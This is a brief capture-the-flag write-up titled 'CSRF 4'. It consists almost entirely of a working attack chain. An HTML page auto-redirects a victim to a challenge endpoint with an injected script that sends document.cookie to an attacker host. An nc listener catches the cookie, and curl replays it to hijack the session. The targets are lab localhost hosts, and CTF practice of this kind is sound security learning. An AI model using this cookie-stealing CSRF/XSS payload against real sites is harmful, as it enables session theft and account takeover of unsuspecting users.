# CSRF 4

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/ephemeral?msg='+'<'+'script>window.location.href=&quot;http://hacker.localhost:5050?cookie=&quot;%2bdocument.cookie</script'+'>'"></body>
</html>
```

Start the attacker server:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```

Listen for cookie:

```shell
nc -l -v hacker.localhost 5050
```

Use the stolen cookie:

```shell
curl -v --cookie "<stolen cookie>" http://challenge.localhost
```
